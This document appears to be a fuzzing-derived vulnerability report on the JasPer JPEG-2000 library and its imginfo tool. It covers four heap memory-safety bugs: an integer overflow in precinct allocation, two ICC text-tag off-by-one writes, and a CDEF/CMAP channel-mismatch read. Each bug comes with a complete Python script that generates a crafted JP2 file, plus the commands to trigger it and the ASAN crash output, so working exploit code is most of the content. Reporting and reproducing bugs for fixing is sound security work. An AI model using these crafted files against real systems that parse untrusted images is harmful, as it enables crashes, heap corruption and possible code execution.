# jasper (imginfo) Vulnerabilities

## Bug1: Signed Integer Overflow in jpc_dec_tileinit numprcs Computation Leads to Heap Out-of-Bounds Read and Write

In `jpc_dec_tileinit()` in `jpc_dec.c` at line 777, the product `rlvl->numhprcs * rlvl->numvprcs` is computed as a signed 32-bit integer with no overflow check, so a crafted JP2 file with a 65537x65537 single-tile image and 1x1-pixel explicit precincts causes the product to wrap from 4,295,098,369 to 131,073, resulting in severely under-allocated `band->prcs` and `prclyrnos` heap buffers that are subsequently accessed out-of-bounds during RPCL packet iteration.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def u8(v):
    return struct.pack(">B", v)

def u16(v):
    return struct.pack(">H", v)

def u32(v):
    return struct.pack(">I", v)

def make_box(box_type, data):
    total_len = 8 + len(data)
    return struct.pack(">I", total_len) + box_type.encode() + data

def build_jp2():
    sig_box = b'\x00\x00\x00\x0C\x6A\x50\x20\x20\x0D\x0A\x87\x0A'

    ftyp_data = b'jp2 ' + b'\x00\x00\x00\x00' + b'jp2 '
    ftyp_box = make_box('ftyp', ftyp_data)

    ihdr_data = (
        u32(65537) + u32(65537) + u16(1) + u8(7) + u8(7) + u8(0) + u8(0)
    )
    ihdr_box = make_box('ihdr', ihdr_data)

    colr_data = u8(1) + u8(0) + u8(0) + u32(17)
    colr_box = make_box('colr', colr_data)

    jp2h_box = make_box('jp2h', ihdr_box + colr_box)

    soc = b'\xFF\x4F'

    siz_payload = (
        u16(0)
        + u32(65537) + u32(65537)
        + u32(0) + u32(0)
        + u32(65537) + u32(65537)
        + u32(0) + u32(0)
        + u16(1)
        + u8(7) + u8(1) + u8(1)
    )
    siz = b'\xFF\x51' + u16(2 + len(siz_payload)) + siz_payload

    # Scod=0x01 (explicit precincts), ProgOrder=0x02 (RPCL), numLayers=1, MCT=0
    # numdlvls=0 (1 resolution level), xcb=2, ycb=2, cblkstyle=0, Cmodes=0
    # precinct_size=0x00 => prcwidthexpn=prcheightexpn=0 => 1x1 pixel precincts
    # numhprcs=numvprcs=65537 => numprcs=65537*65537=4295098369 => OVERFLOW => 131073
    cod_payload = (
        u8(0x01)
        + u8(0x02) + u16(1) + u8(0)
        + u8(0) + u8(2) + u8(2) + u8(0) + u8(0)
        + u8(0x00)
    )
    cod = b'\xFF\x52' + u16(2 + len(cod_payload)) + cod_payload

    # QCD required for jpc_dec_cp_isvalid: NOQNT, 1 band, exponent=8
    qcd = b'\xFF\x5C' + u16(4) + u8(0x20) + u8(0x40)

    # 150000 zero bytes: ~131073 empty packets before OOB at prcno=131073
    tile_data = b'\x00' * 150000
    sod = b'\xFF\x93'
    psot = 12 + 2 + len(tile_data)
    sot_payload = u16(0) + u32(psot) + u8(0) + u8(1)
    sot = b'\xFF\x90' + u16(2 + len(sot_payload)) + sot_payload
    eoc = b'\xFF\xD9'

    codestream = soc + siz + cod + qcd + sot + sod + tile_data + eoc
    cs_box = make_box('jp2c', codestream)

    return sig_box + ftyp_box + jp2h_box + cs_box

if __name__ == '__main__':
    data = build_jp2()
    with open('poc_input.jp2', 'wb') as f:
        f.write(data)
    print(f"Generated poc_input.jp2 ({len(data)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** runtime error: signed integer overflow: 65537 * 65537 cannot be represented in type 'int'
    #0 jpc_dec_tileinit (jpc_dec.c:777)
    #1 jpc_dec_process_sod
imginfo: jpc_t2cod.c:305: jpc_pi_nextrpcl: Assertion `pi->prcno < pi->pirlvl->numprcs' failed.

### Impact

An attacker can supply a crafted JP2 file that causes a signed integer overflow in `jpc_dec_tileinit()`, leading to severe under-allocation of heap buffers followed by out-of-bounds write to `pirlvl->prclyrnos` and out-of-bounds read from `band->prcs` at an attacker-controlled index. This attack surface is exposed to any process or service that invokes `imginfo` or links against libjasper to process untrusted JP2 input. The out-of-bounds write can corrupt heap metadata or adjacent allocations, providing a realistic path to arbitrary code execution, while the out-of-bounds read can leak heap addresses to assist ASLR bypass.

<!-- REPORT_SOURCE: src_appl_imginfo_c#001 -->
<!-- DEDUP: jpc_dec_tileinit::CWE-190 -->

## Bug2: Heap OOB write in jas_icctxtdesc_input when asclen is zero

In `jas_icctxtdesc_input()` (`src/libjasper/base/jas_icc.c`, around line 1108), the attacker-controlled field `asclen` is read as an unsigned 32-bit value from the ICC profile stream and no check is performed to reject a value of zero before computing `txtdesc->ascdata[txtdesc->asclen - 1] = '\0'`, so when `asclen` is zero the unsigned subtraction wraps to `UINT_FAST32_MAX` and a one-byte write is performed at an address far past the heap allocation causing a heap buffer overflow.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT_FILE = "poc_input.jp2"


def box(type4b, payload):
    total = 8 + len(payload)
    return struct.pack(">I", total) + type4b + payload


def build_icc_profile():
    PROFILE_SIZE = 128 + 4 + 12 + 90  # 234

    hdr  = struct.pack(">I", PROFILE_SIZE)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x02100000)
    hdr += struct.pack(">I", 0x6D6E7472)
    hdr += struct.pack(">I", 0x52474220)
    hdr += struct.pack(">I", 0x58595A20)
    hdr += struct.pack(">HHHHHH", 2024, 1, 1, 0, 0, 0)
    hdr += struct.pack(">I", 0x61637370)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">Q", 0)
    hdr += struct.pack(">I", 0)
    hdr += struct.pack(">iii", 0x0000F6D6, 0x00010000, 0x0000D32D)
    hdr += struct.pack(">I", 0)
    hdr += b'\x00' * 44
    assert len(hdr) == 128

    tag_count = struct.pack(">I", 1)

    TAG_SIG  = 0x64657363
    TAG_OFF  = 128 + 4 + 12
    TAG_SIZE = 90
    tag_table = struct.pack(">III", TAG_SIG, TAG_OFF, TAG_SIZE)

    tag_data  = struct.pack(">II", TAG_SIG, 0)
    tag_data += struct.pack(">I", 0)        # asclen = 0  <-- triggers bug
    tag_data += struct.pack(">I", 0)        # uclangcode
    tag_data += struct.pack(">I", 0)        # uclen = 0
    tag_data += struct.pack(">H", 0)        # sccode
    tag_data += struct.pack(">B", 0)        # maclen
    tag_data += b'\x00' * 67               # macdata
    assert len(tag_data) == 90

    return hdr + tag_count + tag_table + tag_data


CODESTREAM_BYTES = bytes.fromhex(
    "ff4fff51002c000000000020000000200000000000000000"
    "000000200000002000000000000000000002070101030101"
    "ff52000c00000001000504040001"
    "ff5c001320485050585050585050585050504848"
    "50ff64001100014b616b6164752d76352e322e31"
    "ff90000a00000000007c0001"
    "ff93c7d4040198c7d4040850a7e00406f3cfc008"
    "043da3ed04000c17c983c7da06000d0211a1f502"
    "8000cfd55d30c3ea0600221a0862fe7aa0f9c480"
    "3e62a2ad886db1e167c1f38b0036a199ae63a335"
    "68ebc4d2a0f904009d96a901042b10d8c1f20c00"
    "5fa7c788a00db060e8067de3ffd9"
)


def build_jp2():
    jp_sig = box(b"jP  ", struct.pack(">I", 0x0D0A870A))

    ftyp_payload = b"jp2 " + struct.pack(">I", 0) + b"jp2 "
    ftyp = box(b"ftyp", ftyp_payload)

    ihdr_payload = struct.pack(">IIHBBBB", 32, 32, 2, 0xff, 7, 1, 0)
    ihdr = box(b"ihdr", ihdr_payload)

    icc_data = build_icc_profile()
    colr_payload = struct.pack("BBB", 2, 0, 0) + icc_data
    colr = box(b"colr", colr_payload)

    jp2h = box(b"jp2h", ihdr + colr)

    jp2c_len = 8 + len(CODESTREAM_BYTES)
    jp2c = struct.pack(">I", jp2c_len) + b"jp2c" + CODESTREAM_BYTES

    return jp_sig + ftyp + jp2h + jp2c


if __name__ == "__main__":
    data = build_jp2()
    with open(OUT_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000090f at pc 0x564ee236b83d bp 0x7ffd793a0580 sp 0x7ffd793a0570
WRITE of size 1 at 0x50200000090f thread T0
    #0 0x564ee236b83c in jas_icctxtdesc_input (imginfo+0x6f283c)
    #1 0x564ee2390d1b in jas_iccprof_load (imginfo+0x717d1b)

### Impact

An attacker who supplies a crafted JP2 file with an embedded ICC profile containing a `desc` tag with `asclen` set to zero can trigger an unconditional one-byte write at an address offset of `UINT_FAST32_MAX` bytes past a heap allocation, reliably causing a heap buffer overflow and process crash. Any application or pipeline that invokes `imginfo` on untrusted JP2 input is exposed to this denial-of-service condition with no authentication or special privilege required. On platforms where such a distant address falls within a mapped writable region, the primitive could theoretically be used for memory corruption leading to arbitrary code execution, though in practice this requires very specific memory layout conditions.

<!-- REPORT_SOURCE: src_libjasper_base_jas_icc_c#001 -->
<!-- DEDUP: jas_icctxtdesc_input::CWE-787 -->

## Bug3: Heap OOB read in jp2_decode due to CDEF/CMAP numchans mismatch

In `jp2_decode` (`src/libjasper/jp2/jp2_dec.c`, lines 402–413), the loop bound `dec->numchans` is taken from the CMAP box while `dec->cdef->data.cdef.ents` is heap-allocated using the independently parsed CDEF box channel count, and the absence of any cross-validation between these two values allows the loop to read beyond the end of the `ents` buffer when CMAP numchans exceeds CDEF numchans.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = 'poc_input.jp2'

def make_box(type_tag: bytes, data: bytes) -> bytes:
    assert len(type_tag) == 4
    length = 8 + len(data)
    return struct.pack('>I', length) + type_tag + data

# 1. JP2 Signature box
sig_box = make_box(b'jP  ', b'\x0D\x0A\x87\x0A')

# 2. File Type box
ftyp_data = b'jp2 ' + struct.pack('>I', 0) + b'jp2 '
ftyp_box = make_box(b'ftyp', ftyp_data)

# 3. JP2 Header superbox contents
ihdr_data  = struct.pack('>II', 1, 1)
ihdr_data += struct.pack('>H', 3)
ihdr_data += bytes([7, 7, 0, 0])
ihdr_box = make_box(b'ihdr', ihdr_data)

bpcc_box = make_box(b'bpcc', bytes([7, 7, 7]))

colr_data = struct.pack('>BBB', 1, 0, 0) + struct.pack('>I', 16)
colr_box = make_box(b'colr', colr_data)

# pclr: 4 entries, 1 channel, 8-bit unsigned
pclr_data  = struct.pack('>H', 4)
pclr_data += bytes([1])
pclr_data += bytes([7])
pclr_data += bytes([0x00, 0x40, 0x80, 0xFF])
pclr_box = make_box(b'pclr', pclr_data)

# cmap: 3 entries (sets dec->numchans = 3)
cmap_data = b''
for _ in range(3):
    cmap_data += struct.pack('>H', 0) + bytes([1, 0])
cmap_box = make_box(b'cmap', cmap_data)

# cdef: only 1 entry (ents[] allocated for 1 element — triggers OOB when loop runs 3 times)
cdef_data  = struct.pack('>H', 1)
cdef_data += struct.pack('>HHH', 0, 0, 1)
cdef_box = make_box(b'cdef', cdef_data)

jp2h_content = ihdr_box + bpcc_box + colr_box + pclr_box + cmap_box + cdef_box
jp2h_box = make_box(b'jp2h', jp2h_content)

# 4. Minimal JPEG-2000 codestream
soc = b'\xFF\x4F'

siz  = b'\xFF\x51'
siz += struct.pack('>HH', 41, 0)
siz += struct.pack('>IIIIIIII', 1, 1, 0, 0, 1, 1, 0, 0)
siz += struct.pack('>H', 1)
siz += bytes([7, 1, 1])

cod  = b'\xFF\x52'
cod += struct.pack('>HB', 12, 0)
cod += bytes([0x00, 0x00, 0x01, 0x00])
cod += bytes([0x00, 0x04, 0x04, 0x00, 0x01])

qcd  = b'\xFF\x5C'
qcd += struct.pack('>H', 4)
qcd += bytes([0x00])
qcd += bytes([0x20])

sot  = b'\xFF\x90'
sot += struct.pack('>H', 10)
sot += struct.pack('>H', 0)
sot += struct.pack('>I', 14)
sot += bytes([0, 1])

sod = b'\xFF\x93'
eoc = b'\xFF\xD9'

codestream = soc + siz + cod + qcd + sot + sod + eoc
jp2c_box = make_box(b'jp2c', codestream)

# 5. Assemble final JP2 file
jp2_bytes = sig_box + ftyp_box + jp2h_box + jp2c_box

with open(OUTPUT_FILE, 'wb') as f:
    f.write(jp2_bytes)

print(f"[+] Written {len(jp2_bytes)} bytes to {OUTPUT_FILE}")
print(f"    CMAP numchans: 3  (dec->numchans = 3)")
print(f"    CDEF numchans: 1  (ents[] has 1 entry)")
print(f"    Loop at jp2_dec.c:403 reads ents[1] and ents[2] => heap OOB read")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000238 at pc 0x5648e0060fe6 bp 0x7ffdcfa3fb70 sp 0x7ffdcfa3fb60
READ of size 8 at 0x503000000238 thread T0
    #0 0x5648e0060fe5 in jp2_decode (imginfo+0x52cfe5)
    #1 0x5648e00074ef in jas_image_decode (imginfo+0x4d34ef)

### Impact

An attacker who supplies a crafted JP2 file with a CMAP box declaring more channels than the CDEF box can trigger a heap-buffer-overflow read in `jp2_decode`, causing adjacent heap memory to be interpreted as channel metadata, which may leak sensitive heap contents (information disclosure) or cause the process to crash (denial of service). Any invocation of `imginfo` or any application calling `jas_image_decode` on an untrusted JP2 file is exposed to this vulnerability with no authentication required. If the out-of-bounds `channo` value passes the bounds guard, the corrupted value is forwarded to `jas_image_setcmpttype`, creating a path toward further heap corruption that could potentially lead to arbitrary code execution.

<!-- REPORT_SOURCE: src_appl_jasper_c#001 -->
<!-- DEDUP: ::CWE-125 -->

## Bug4: Heap buffer underwrite in jas_icctxt_input when cnt is zero

In `jas_icctxt_input()` in `src/libjasper/base/jas_icc.c`, there is no check that `cnt` is greater than zero before computing `txt->string[cnt - 1] = '\0'`, so when `cnt` is zero (derived from a tag table entry whose `len` field equals eight) the write lands one byte before the start of a zero-byte heap allocation, producing a heap buffer underwrite.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC for heap buffer underwrite in jas_icctxt_input (cnt=0).

Embeds a crafted ICC profile inside a JP2 COLR box (method=2).
The 'cprt' tag table entry has len=8, so cnt = len-8 = 0.
jas_icctxt_input() then writes txt->string[-1] = '\\0'.

Requires a valid JPEG-2000 codestream file (any JP2) whose path is
passed as the first argument or set in the TEMPLATE_JP2 environment
variable.  Example:
    python3 gen.py /path/to/any/valid.jp2
"""

import os
import struct
import sys

TEMPLATE_JP2 = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TEMPLATE_JP2", "")
OUT_FILE = "poc_input.jp2"


# ---------------------------------------------------------------------------
# ICC profile construction
# ---------------------------------------------------------------------------

def build_icc_profile():
    ICC_HDR_LEN  = 128
    num_tags     = 1
    tag_tbl_sz   = num_tags * 12
    tag_data_off = ICC_HDR_LEN + 4 + tag_tbl_sz  # 144
    icc_size     = tag_data_off + 8               # 152

    # 128-byte header
    hdr  = struct.pack(">I", icc_size)   # profile size
    hdr += b'\x00' * 4                   # cmmtype
    hdr += b'\x04\x30\x00\x00'          # version 4.3.0
    hdr += b'mntr'                       # profile class
    hdr += b'RGB '                       # colour space
    hdr += b'XYZ '                       # PCS
    hdr += b'\x00' * 12                  # date/time
    hdr += b'acsp'                       # magic
    hdr += b'\x00' * 4                   # platform
    hdr += b'\x00' * 4                   # flags
    hdr += b'\x00' * 4                   # device manufacturer
    hdr += b'\x00' * 4                   # device model
    hdr += b'\x00' * 8                   # attributes
    hdr += b'\x00' * 4                   # rendering intent
    hdr += b'\x00' * 12                  # PCS illuminant
    hdr += b'\x00' * 4                   # creator
    hdr += b'\x00' * 44                  # reserved
    assert len(hdr) == ICC_HDR_LEN

    tag_count = struct.pack(">I", num_tags)

    # TAG KEY: len=8 => cnt = 8-8 = 0 inside jas_iccprof_load
    TAG_CPRT  = 0x63707274
    tag_entry = struct.pack(">III", TAG_CPRT, tag_data_off, 8)

    TYPE_TEXT = 0x74657874
    tag_data  = struct.pack(">II", TYPE_TEXT, 0)

    profile = hdr + tag_count + tag_entry + tag_data
    assert len(profile) == icc_size
    return profile


# ---------------------------------------------------------------------------
# JP2 box helpers
# ---------------------------------------------------------------------------

def box(type_bytes, data):
    return struct.pack(">I", 8 + len(data)) + type_bytes + data

def box_eof(type_bytes, data):
    return struct.pack(">I", 0) + type_bytes + data


# ---------------------------------------------------------------------------
# Extract jp2c codestream from a template JP2
# ---------------------------------------------------------------------------

def extract_jpc(jp2_path):
    with open(jp2_path, 'rb') as f:
        raw = f.read()
    offset = 0
    while offset < len(raw):
        if offset + 8 > len(raw):
            break
        box_len  = struct.unpack(">I", raw[offset:offset+4])[0]
        box_type = raw[offset+4:offset+8]
        if box_len == 0:
            content = raw[offset+8:]
            nxt = len(raw)
        elif box_len < 8:
            break
        else:
            content = raw[offset+8:offset+box_len]
            nxt = offset + box_len
        if box_type == b'jp2c':
            return content
        offset = nxt
    raise ValueError(f"jp2c box not found in {jp2_path}")


# ---------------------------------------------------------------------------
# Assemble JP2
# ---------------------------------------------------------------------------

def build_jp2(icc_profile, jpc_data):
    jp_sig = struct.pack(">I", 12) + b'jP  ' + b'\x0d\x0a\x87\x0a'

    ftyp_data = b'jp2 ' + b'\x00\x00\x00\x00' + b'jp2 '
    ftyp = box(b'ftyp', ftyp_data)

    ihdr_data = struct.pack(">I", 32) + struct.pack(">I", 32) + \
                struct.pack(">H", 2) + bytes([7, 7, 0, 0])
    ihdr = box(b'ihdr', ihdr_data)

    # method=2 (ICC Restricted Profile), prec=0, approx=0
    colr_data = bytes([2, 0, 0]) + icc_profile
    colr = box(b'colr', colr_data)

    jp2h = box(b'jp2h', ihdr + colr)
    jp2c = box_eof(b'jp2c', jpc_data)

    return jp_sig + ftyp + jp2h + jp2c


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    if not TEMPLATE_JP2:
        print("Usage: python3 gen.py <template.jp2>")
        print("  or:  TEMPLATE_JP2=/path/to/valid.jp2 python3 gen.py")
        sys.exit(1)

    icc_profile = build_icc_profile()
    print(f"[*] ICC profile: {len(icc_profile)} bytes  (cprt tag len=8 => cnt=0)")

    jpc_data = extract_jpc(TEMPLATE_JP2)
    print(f"[*] JPC codestream: {len(jpc_data)} bytes from {TEMPLATE_JP2}")

    jp2_bytes = build_jp2(icc_profile, jpc_data)
    with open(OUT_FILE, 'wb') as f:
        f.write(jp2_bytes)
    print(f"[*] Written {len(jp2_bytes)} bytes to {OUT_FILE}")
    print("[*] Expected: jas_icctxt_input(cnt=0) => txt->string[-1]='\\0' => ASAN abort")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py /path/to/any/valid.jp2
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000090f at pc 0x563c3db80735 bp 0x7fffdf8424b0 sp 0x7fffdf8424a0
WRITE of size 1 at 0x50200000090f thread T0
    #0 0x563c3db80734 in jas_icctxt_input (imginfo+0x6dc734)
    #1 0x563c3dbbbd1b in jas_iccprof_load (imginfo+0x717d1b)
0x50200000090f is located 1 bytes to the left of 1-byte region [0x502000000910,0x502000000911)

### Impact

An attacker can supply a crafted JP2 file whose embedded ICC profile contains a TXT-type tag with a tag-table `len` field of exactly eight, causing a one-byte heap underwrite that writes a zero byte immediately before a zero-byte allocation and corrupts the allocator metadata or an adjacent heap object. This write can destabilize the heap in a way that leads to a subsequent crash (denial of service) during `free` or `malloc`, and with a carefully laid-out heap state an attacker may be able to leverage the corruption to achieve arbitrary code execution. The attack surface is any invocation of `imginfo` (or any application using libjasper for JP2 decoding) on an untrusted input file, requiring no special privileges.

<!-- REPORT_SOURCE: src_libjasper_base_jas_icc_c#002 -->
<!-- DEDUP: jas_icctxt_input::CWE-787 -->
